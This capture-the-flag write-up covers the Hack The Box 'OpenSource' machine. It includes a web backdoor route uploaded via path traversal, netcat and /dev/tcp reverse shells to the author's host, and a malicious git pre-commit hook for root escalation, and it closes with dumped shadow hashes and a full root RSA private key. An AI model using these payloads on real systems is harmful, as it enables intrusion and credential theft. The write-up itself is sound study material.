---
layout: single
title: OpenSource - Hack The Box
excerpt: "OpenSource is an easy-rated Linux machine from Hack The Box. As the name suggests we're met with an OpenSource project that have over shared, in making them vulnerable to code execution. The path to user is quiet unique and it alone makes this box very enjoyable! As a total git-noob I learned a lot through this box, and I can see why it would be rated as easy if you know your way around git, but for me I would rate this as medium."
date: 2022-05-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-opensource/opensource_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - easy
  - git
  - python
  - docker
---

![](/assets/images/htb-writeup-opensource/opensource_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

OpenSource is an easy-rated Linux machine from Hack The Box. As the name suggests we're met with an OpenSource project that have over shared, in making them vulnerable to code execution. The path to user is quiet unique and it alone makes this box very enjoyable! As a total git-noob I learned a lot through this box, and I can see why it would be rated as easy if you know your way around git, but for me I would rate this as medium.
<br>

----------------


# USER
### Step 1
**nmap:**
```bash
➜  opensource nmap -Pn -n -p- 10.129.69.218 -v
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

➜  opensource nmap -Pn -n -sCV -p22,80,3000 10.129.69.218
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 23 May 2022 17:53:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 23 May 2022 17:53:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp

➜  opensource sudo nmap -sU --top-port=50 --open 10.129.69.218
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

**webanalyze:**
```bash
➜  webanalyze ./webanalyze -host http://10.129.69.218
http://10.129.69.218 (0.1s):
    Python, 3.10.3 (Programming languages)
    Bootstrap,  (UI frameworks)
    Flask, 2.1.2 (Web frameworks, Web servers)
    Python,  (Programming languages)
```

Visit the webpage and we find a site where we can upload files without authentication. The code is OpenSource and we are able to download it all. 

Download the code and extract it. First thing we see is a `.git` directory, lets look for secrets there! 
```bash
➜  logs git:(public) cat HEAD 
0000000000000000000000000000000000000000 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <gituser@local> 1651146317 +0200	commit (initial): initial
ee9d9f1ef9156c787d53074493e39ae364cd1e05 0000000000000000000000000000000000000000 gituser <gituser@local> 1651146317 +0200	Branch: renamed refs/heads/master to refs/heads/public
0000000000000000000000000000000000000000 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <gituser@local> 1651146317 +0200	Branch: renamed refs/heads/master to refs/heads/public
ee9d9f1ef9156c787d53074493e39ae364cd1e05 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <gituser@local> 1651146352 +0200	checkout: moving from public to dev
ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820 gituser <gituser@local> 1651146376 +0200	commit: updated
a76f8f75f7a4a12b706b0cf9c983796fa1985820 be4da71987bbbc8fae7c961fb2de01ebd0be1997 gituser <gituser@local> 1651146414 +0200	commit: added gitignore
be4da71987bbbc8fae7c961fb2de01ebd0be1997 c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser <gituser@local> 1651146444 +0200	commit: ease testing
c41fedef2ec6df98735c11b2faf1e79ef492a0f3 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <gituser@local> 1651146451 +0200	checkout: moving from dev to public
ee9d9f1ef9156c787d53074493e39ae364cd1e05 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser <gituser@local> 1651146955 +0200	commit: clean up dockerfile for production use
2c67a52253c6fe1f206ad82ba747e43208e8cfd9 c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser <gituser@local> 1651147059 +0200	checkout: moving from public to dev
c41fedef2ec6df98735c11b2faf1e79ef492a0f3 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser <gituser@local> 1651150220 +0200	checkout: moving from dev to public
```

```bash
➜  logs git:(public) git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820
[... snip ...]
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

We find a set of creds, `dev01:Soulless_Developer#2022`, although it's towards an IP and port that we don't recognize. Lets look if it's the same for SSH.
```bash
➜  opensource ssh dev01@10.129.69.218
[... snip ...]
dev01@10.129.69.218: Permission denied (publickey).
```

Trying to download a file that doesn't exist they leak the PATH and a secret key in the error response, however `/console` is locked with a PIN so we can't get RCE there..
```html
## REQUEST
GET /uploads/asdf.py HTTP/1.1
Host: 10.129.69.218

## RESPONSE
[... snip ...]
  <head>
    <title>FileNotFoundError: [Errno 2] No such file or directory: '/app/public/uploads/asdauthorized_keys'
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "E7MAYp3KlTA309Ic1hST";
    </script>
  </head>
```

---------------
### Step 2
Instead, we can focus on the source code, especially the upload function in `views.py`
```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```

And from `utils.py` we find two interesting comments.
```bash
Pass filename and return a secure version, which can then safely be stored on a regular file system.

TODO: get unique filename
```

The theory is that we can create our own code in `views.py`, upload it to replace the original file and thus granting code execution.

Create my own custom `views.py`:
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/e')
def exec_cmd():
    return os.system(request.args.get('cmd'))
```

Upload the file and capture the POST request, forward it to repeater and change `filename` parameter to `/app/app/views.py` to write over the original file.
```http
Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
```

We should now be able to execute os-commands. Testing several different reverse shells I finally find one that works.
```http
GET /e?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.15.17+4488+%3E/tmp/f HTTP/1.1
Host: 10.129.69.218
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```bash
➜  opensource nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.15.17] from (UNKNOWN) [10.129.69.218] 46477
/app # id && hostname
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
a18fa0f4252c
```

-----------
### Step 3
We're in a docker container.. both `capsh` and `getcap` is unavailable, we don't have permissions to mount to the host file system. We are unable to SSH to the host with found creds.. but when using `wget` to enumerate `http://172.17.0.1` we find a webfront where user `dev01` is a member - `http://opensource.htb:3000/dev01`. 

```bash
➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 3333 -reverse
2022/05/24 10:26:12 server: Reverse tunnelling enabled
2022/05/24 10:26:12 server: Fingerprint 0w1VYvw5UN5G517RVqpm0jScfuRrA5gZN3N7h5iXI10=
2022/05/24 10:26:12 server: Listening on http://0.0.0.0:3333
```

```bash
/app/public/uploads # ./chisel_1.7.7_linux_amd64 client 10.10.15.17:3333 R:127.0.0.1:3000:172.17.0.1:3000
2022/05/24 08:26:43 client: Connecting to ws://10.10.15.17:3333
2022/05/24 08:26:43 client: Connected (Latency 43.290943ms)
```


![](/assets/images/htb-writeup-opensource/opensource01.png)

Login with previously found credentials, `dev01:Soulless_Developer#2022`, and grab the private key. 

![](/assets/images/htb-writeup-opensource/opensource02.png)

```bash
➜  opensource chmod 400 id_rsa 
➜  opensource ssh dev01@10.129.70.252 -i id_rsa 
dev01@opensource:~$ id && hostname
uid=1000(dev01) gid=1000(dev01) groups=1000(dev01)
opensource

dev01@opensource:~$ pwd
/home/dev01

dev01@opensource:~$ cat user.txt
48e3b2ed54ab95e7339d32f60f3f8f46
```

-------------

# ROOT
### Step 1
We are unable to run `sudo -l`, and the groups look fine. 
Reading about GiTea vulnerabilities a lot of articles point towards an authenticated RCE through Git Hooks.

Looking in our web-gui we don't seem to have that option available.
![](/assets/images/htb-writeup-opensource/opensource03.png)

Here's an vulnerable example:
![](/assets/images/htb-writeup-opensource/opensource04.png)

But, we don't need the web-gui, we have the `.git` in our home directory as user `dev01`. 
```bash
dev01@opensource:~/.git$ ls -al
total 60
drwxrwxr-x  8 dev01 dev01 4096 May 24 11:18 .
drwxr-xr-x  8 dev01 dev01 4096 May 24 11:12 ..
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches
-rw-r--r--  1 dev01 dev01   22 May 24 11:12 COMMIT_EDITMSG
-rw-rw-r--  1 dev01 dev01  269 May 24 11:18 config
-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description
-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD
-rw-r--r--  1 dev01 dev01   21 May 16 12:50 HEAD
drwxrwxr-x  2 dev01 dev01 4096 May 24 11:12 hooks
-rw-r--r--  1 root  root  1066 May 24 11:13 index
drwxrwxr-x  2 dev01 dev01 4096 May 24 10:34 info
drwxr-xr-x  3 dev01 dev01 4096 May 24 10:34 logs
drwxrwxr-x 10 dev01 dev01 4096 May 24 11:13 objects
-rw-rw-r--  1 dev01 dev01  232 May 24 10:34 packed-refs
drwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs

dev01@opensource:~/.git/hooks$ ls -al
total 60
drwxrwxr-x 2 dev01 dev01 4096 May 24 11:12 .
drwxrwxr-x 8 dev01 dev01 4096 May 24 11:19 ..
-rwxrwxr-x 1 dev01 dev01  478 Mar 23 01:18 applypatch-msg.sample
-rwxrwxr-x 1 dev01 dev01  896 Mar 23 01:18 commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 3327 Mar 23 01:18 fsmonitor-watchman.sample
-rwxrwxr-x 1 dev01 dev01  189 Mar 23 01:18 post-update.sample
-rwxrwxr-x 1 dev01 dev01  424 Mar 23 01:18 pre-applypatch.sample
-rwxrwxr-x 1 dev01 dev01 1642 Mar 23 01:18 pre-commit.sample
-rwxrwxr-x 1 dev01 dev01 1492 Mar 23 01:18 prepare-commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 1348 Mar 23 01:18 pre-push.sample
-rwxrwxr-x 1 dev01 dev01 4898 Mar 23 01:18 pre-rebase.sample
-rwxrwxr-x 1 dev01 dev01  544 Mar 23 01:18 pre-receive.sample
-rwxrwxr-x 1 dev01 dev01 3610 Mar 23 01:18 update.sample
```

Git Hooks are scripts executed by the server when a commit is pushed to a repository.
There are no pre-configured hooks, and for us to escalate privileges something has to be pushed / commited / updated. 
Upload `pspy64` to the victim and run it.

```bash
dev01@opensource:/dev/shm$ ./pspy64
[... snip ...]
2022/05/24 09:02:01 CMD: UID=0    PID=11447  | git commit -m Backup for 2022-05-24 
2022/05/24 09:02:01 CMD: UID=0    PID=11449  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/05/24 09:02:01 CMD: UID=0    PID=11448  | git push origin main 
```

It seems like backups are commited frequently by **UID 0** (root), we should be able to exploit this by creating our own pre-commit / commit-msg / prepare-commit-msg script. 

```bash
dev01@opensource:~/.git/hooks$ ls -al pre-commit
-rwxrwxr-x 1 dev01 dev01 54 May 24 11:12 pre-commit

dev01@opensource:~/.git/hooks$ cat pre-commit
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.17/4488 0>&1
```

Wait for the backup to be made and we should get our reverse shell! 

```bash
➜  chisel_1.7.7 nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.15.17] from (UNKNOWN) [10.129.70.252] 43612
bash: cannot set terminal process group (21874): Inappropriate ioctl for device
bash: no job control in this shell
root@opensource:/home/dev01# id
uid=0(root) gid=0(root) groups=0(root)

root@opensource:/home/dev01# cat /root/root.txt
6d931e05a808f004c7ec976de9be27ff

root@opensource:/home/dev01# cat /etc/shadow
root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::
dev01:$6$KxPkBXel$7cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC/j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh/:19073:0:99999:7:::

root@opensource:/home/dev01# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

------------

# References
**GiTea Hooks RCE**
https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
https://muirlandoracle.co.uk/2020/09/04/year-of-the-dog-write-up/
https://hngnh.com/posts/DevGuru-CTF-Writeup/
